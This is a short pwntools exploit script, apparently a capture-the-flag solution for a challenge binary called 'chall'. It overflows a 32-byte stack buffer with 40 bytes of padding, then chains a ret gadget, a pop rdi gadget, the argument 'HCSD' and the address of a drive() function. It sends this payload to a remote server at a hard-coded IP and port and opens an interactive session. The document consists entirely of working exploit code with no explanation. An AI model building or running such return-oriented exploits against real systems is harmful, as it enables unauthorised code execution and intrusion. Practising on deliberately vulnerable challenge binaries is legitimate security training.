from pwn import *

context.binary = binary = ELF("./chall")

# Found addresses
pop_rdi_ret = 0x4011BE
ret_gadget = 0x4011BF
drive_addr = 0x401211
secret_arg = 0x48435344

# Padding: 32 bytes (buffer) + 8 bytes (saved RBP) = 40 bytes
payload = b"A" * 40
payload += p64(ret_gadget)  # Stack alignment
payload += p64(pop_rdi_ret)  # Gadget to set RDI
payload += p64(secret_arg)  # The argument "HCSD"
payload += p64(drive_addr)  # Call drive()

# Connect and exploit
p = remote("143.198.163.4", 15858)
p.recvuntil(b"2 Canary Court\n\n")
p.sendline(payload)
p.interactive()
